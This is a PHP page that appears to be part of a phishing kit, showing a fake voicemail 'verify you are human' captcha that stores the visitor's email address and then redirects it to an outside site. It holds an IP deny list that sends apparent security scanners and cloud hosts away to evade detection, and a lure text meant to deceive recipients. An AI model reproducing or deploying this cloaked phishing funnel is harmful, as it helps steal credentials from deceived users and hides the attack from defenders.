<?php session_start();
$deny = array("13.239.62.44", "54.233.137.119", "162.243.187.126", "46.101.94.163", "31.6.58.60", "87.89.48.69", "92.23.59.24", "5.62.41.36", "154.70.155.194", "18.231.48.187", "46.101.94.163", "46.101.119.24", "52.65.198.212", "54.252.230.248", "52.67.159.194", "40.118.205.169", "199.249.230.77", "50.125.66.169", "194.99.104.130", "51.77.0.80", "40.118.205.169", "199.249.230.77", "50.125.66.169", "196.251.88.139", "185.93.2.59", "196.251.88.139", "84.93.42.239", "196.52.84.53", "82.102.27.51", "5.62.41.37", "165.227.0.128", "92.23.56.101", "185.229.190.136", "50.125.67.177", "104.215.89.177", "188.166.98.249", "138.91.146.139", "50.125.67.177", "159.203.0.156", "188.166.63.71", "165.227.163.166", "139.59.4.194", "142.93.74.68", "64.246.187.119", "157.230.173.0", "52.67.130.154", "40.90.218.216", "72.12.194.91", "103.234.220.197", "162.247.74.204", "40.91.75.16", "72.12.194.91", "103.234.220.197", "162.247.74.204", "18.228.44.24", "72.12.194.150.79", "71.189.173.38", "18.228.44.24", "72.12.194.90", "211.25.3.117", "185.104.120.3", "103.234.220.195", "196.52.84.31", "84.92.138.149", "107.155.49.126", "185.93.2.109", "40.91.75.16");
if (in_array ($_SERVER['REMOTE_ADDR'], $deny)) {
   header("location: https://example.com/");
   exit();
} 


if(isset($_POST["mail"])){
	 		$_SESSION["mail"]=$_POST["mail"];
	 } else {

            $_SESSION["mail"]= $_GET["mail"];
	 }
	


$data = $_GET["mail"];


if(isset($_POST['Submit'])){
	// code for check server side validation
	if(empty($_SESSION['captcha_code'] ) || strcasecmp($_SESSION['captcha_code'], $_POST['captcha_code']) != 0){  
		$msg="<span style='color:red'>The Validation code does not match!</span>";// Captcha verification is incorrect.		
	}else{// Captcha verification is Correct. Final Code Execute here!		
		header ('Location: https://smartbyte.com/ginvoice/?Email='.$data.'');
		
		
	}
}	


	


$data = $_GET["Email"];

?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>PHP Secure Professional Captcha.</title>
<link href="./css/style.css" rel="stylesheet">
<script type='text/javascript'>
function refreshCaptcha(){
	var img = document.images['captchaimg'];
	img.src = img.src.substring(0,img.src.lastIndexOf("?"))+"?rand="+Math.random()*1000;
}
</script>
</head>
<body>
<div id="frame0">
  <h1>Help Us Protect You Kindly Verify You Human</h1>
  <p>And then Proceed to Listen to Voice Mail</a></p>
</div>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<form action="" method="post" name="form1" id="form1" >
  <table width="400" border="0" align="center" cellpadding="5" cellspacing="1" class="table">
    <?php if(isset($msg)){?>
    <tr>
      <td colspan="2" align="center" valign="top"><?php echo $msg;?></td>
    </tr>
    <?php } ?>
    <tr>
      <td align="right" valign="top"> Validation code:</td>
      <td><img src="captcha.php?rand=<?php echo rand();?>" id='captchaimg'><br>
        <label for='message'>Enter the code above here :</label>
        <br>
        <input id="captcha_code" name="captcha_code" type="text">
        <br>
        Can't read the image? click <a href='javascript: refreshCaptcha();'>here</a> to refresh.</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td><input name="Submit" type="submit" onclick="return validate();" value="Proceed to Voice Message" class="button1"></td>
    </tr>
  </table>
</form>
</body>
</html>